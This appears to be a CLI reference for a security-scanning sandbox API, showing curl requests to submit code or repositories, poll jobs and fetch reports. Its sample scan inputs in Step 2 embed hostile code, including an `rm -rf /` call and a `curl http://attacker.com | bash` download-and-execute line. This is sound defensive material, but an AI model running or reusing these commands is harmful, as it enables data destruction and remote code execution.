# OpenSandbox Lifecycle API — CLI Reference

This guide shows you how to interact with the **z1Sandbox Lifecycle API** using
`curl` from a terminal. No UI is required. Every command targets the API
directly.

> **Production endpoint:** `https://api-sandbox.01security.com`

---

## Prerequisites

| Requirement | Details |
|-------------|---------|
| **`curl`** | Available on all Linux/macOS systems |
| **`jq`** *(optional)* | Pretty-prints JSON responses — install with `sudo apt install jq` |

Set this shell variable once so you don't have to repeat it in every command:

```bash
# Base URL — NO path prefix, routes start at /v1/
export API_URL="https://api-sandbox.01security.com"

# Your developer API key JWT from the 01 Security dashboard
export API_KEY=""   # paste your full token here
```

> [!CAUTION]
> Always include `https://` in the URL. Omitting it causes curl to exit with
> **error 5** (couldn't resolve proxy) and no request is sent to the server.

---

## Step 1 — Get Your API Key

The gateway uses a **JWT developer API key** issued by the 01 Security platform.

### 1a. Generate a developer API key from the dashboard

1. Log in to the **01 Security dashboard**
2. Navigate to **API Keys** → **Generate New Key**
3. Copy the full JWT token shown

### 1b. Set it in your shell

```bash
export API_KEY=""
```

> [!WARNING]
> Developer API keys have an **expiry date**. If your token has expired you
> will receive `401 Token has expired`. Generate a new key from the dashboard.

### 1c. Verify your key works

```bash
curl -s -w "\nHTTP:%{http_code}" \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/job-id"
```

Expected responses:
- `404` — connected and authenticated, no jobs yet ✅
- `401` — token is invalid or expired; generate a fresh one from the dashboard
- `403` — no active developer key linked to your account; create one first
- `000` / curl error 5 — you forgot `https://` in the URL

> **Every API request must include the header:**
> ```
> Authorization: Bearer <your-jwt-token>
> ```

---

## Step 2 — Quick Scan (Scan a Code Snippet)

Submit code for security scanning. Always use `?async=true` to avoid gateway
timeouts — the scan returns a `job_id` immediately and runs in the background.

### 2a. Scan a code snippet

```bash
curl -s -X POST "$API_URL/v1/scan-jobs?async=true" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"code": "import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])"}' \
  | jq .
```

### 2b. Scan with specific tools and a timeout

```bash
curl -s -X POST "$API_URL/v1/scan-jobs?async=true" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import os\nos.system(\"curl http://attacker.com | bash\")",
    "tools": ["bandit", "semgrep"],
    "timeout": 120
  }' \
  | jq .
```

### 2c. Scan multiple files at once

```bash
curl -s -X POST "$API_URL/v1/scan-jobs?async=true" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "files": {
      "app.py":   "import pickle\npickle.loads(user_input)",
      "utils.js": "eval(req.body.code)"
    },
    "timeout": 180
  }' \
  | jq .
```

### Expected Response (Quick Scan submission)

```json
{
  "job_id":     "b81d1aba-f023-4514-b7ff-4b97c50ebe63",
  "sandbox_id": null,
  "status":     "PROCESSING",
  "report":     null,
  "error":      null
}
```

Save the `job_id` — you'll use it to poll for results:

```bash
export JOB_ID="b81d1aba-f023-4514-b7ff-4b97c50ebe63"
```

> [!WARNING]
> The body **must be a JSON object** `{"code": "..."}`. A bare JSON string
> `"..."` causes the server to return a non-JSON error response, which makes
> `jq` throw *Invalid numeric literal*.

---

## Step 3 — Repository Scanner (Scan a GitHub Repository)

Provision a sandbox that clones a GitHub repo and runs the full security
toolchain across all files.

### Public repository

```bash
curl -s -X POST "$API_URL/v1/scan-jobs?async=true" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "metadata": {
      "github_url":  "https://github.com/your-org/your-repo",
      "scan_type":   "repository"
    },
    "timeout": 300
  }' \
  | jq .
```

### Private repository (with GitHub token)

```bash
curl -s -X POST "$API_URL/v1/scan-jobs?async=true" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "metadata": {
      "github_url":   "https://github.com/your-org/private-repo",
      "github_token": "ghp_xxxxxxxxxxxxxxxxxxxx",
      "scan_type":    "repository"
    },
    "timeout": 300
  }' \
  | jq .
```

---

## Step 4 — Retrieve the Quick Scan Result

### 4a. Poll scan status (while running)

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-status/$JOB_ID" \
  | jq .
```

### 4b. Fetch the final JSON report

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-jobs/$JOB_ID/report" \
  | jq .
```

**Success (200):**
```json
{
  "summary": { "issues": 2, "severity": "HIGH" },
  "findings": [
    {
      "tool":     "bandit",
      "rule_id":  "B602",
      "severity": "HIGH",
      "message":  "subprocess call with shell=True",
      "file":     "app.py",
      "line":     3
    }
  ]
}
```

### 4c. Get the latest job ID (no job_id needed)

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/job-id" \
  | jq .
# → { "job_id": "b81d1aba-..." }
```

---

## Step 5 — Retrieve the Repository Scanner Result

Identical to Quick Scan — same endpoints, same `job_id` returned on submission.

### 5a. Fetch the full JSON report by job ID

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-jobs/$JOB_ID/report" \
  | jq .
```

### 5b. Poll until the report is ready

```bash
until curl -s \
    -H "Authorization: Bearer $API_KEY" \
    "$API_URL/v1/scan-jobs/$JOB_ID/report" \
    | jq -e '.findings' > /dev/null 2>&1
do
  echo "Scan still running... retrying in 5s"
  sleep 5
done

echo "Scan complete!"
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-jobs/$JOB_ID/report" \
  | jq .
```

### 5c. Save the result to a file

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-jobs/$JOB_ID/report" \
  -o "scan-result-$JOB_ID.json"

echo "Report saved to scan-result-$JOB_ID.json"
```

---

## Useful Additional Commands

### Get status of the latest job (no job_id needed)

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/job-status" \
  | jq .
```

### Check live scan log / status by job ID

```bash
curl -s \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/scan-status/$JOB_ID"
```

### Delete / purge a scan job

```bash
# Cancel only (keeps report data)
curl -s -X DELETE \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/jobs/$JOB_ID"

# Permanently delete everything (report + PVC files)
curl -s -X DELETE \
  -H "Authorization: Bearer $API_KEY" \
  "$API_URL/v1/jobs/$JOB_ID?purge=true"
```

### Health check (no auth required)

```bash
curl -s "https://api-sandbox.01security.com/health" | jq .
```

---

## Route Reference

| Method | Route | Description |
|--------|-------|-------------|
| `POST` | `/v1/scan-jobs?async=true` | Submit code/files for Quick Scan |
| `GET` | `/v1/scan-jobs/{job_id}/report` | Fetch the final JSON scan report |
| `GET` | `/v1/scan-status/{job_id}` | Poll live scan status / log |
| `GET` | `/v1/job-id` | Get the latest submitted job ID |
| `GET` | `/v1/job-status` | Get status of the latest job |
| `DELETE` | `/v1/jobs/{job_id}?purge=true` | Delete / purge a scan job |
| `GET` | `/health` | Health check (no auth) |

---

## Error Reference

| HTTP Code | `detail` / `code` field | Meaning |
|-----------|------------------------|---------|
| `401` | `Execution required an explicit API Key in the Authorization header` | Wrong header — use `Authorization: Bearer <token>`, not `OPEN-SANDBOX-API-KEY` |
| `401` | `Token has expired` | JWT past its `exp` date — generate a new key from the dashboard |
| `401` | `API Key has been deactivated or deleted` | The key's `jti` is no longer registered |
| `401` | `API Key has been revoked` | Key was revoked from the dashboard |
| `403` | `No active or non-expired Developer API Key found` | Create a developer API key in the dashboard first |
| `404` | `No scan jobs have been initiated yet` | No scan submitted in this session yet |
| `404` | `REPORT_NOT_FOUND` | Scan for this `job_id` has no report yet |
| `504` | `504 Gateway Time-out` (HTML) | Scan took too long — always use `?async=true` |
| `500` | `MISSING_CONFIGURATION` | Server env var `SANDBOX_IMAGE` not set |
| `500` | `FILE_SYSTEM_ERROR` | Server failed to write/read files on the PVC |
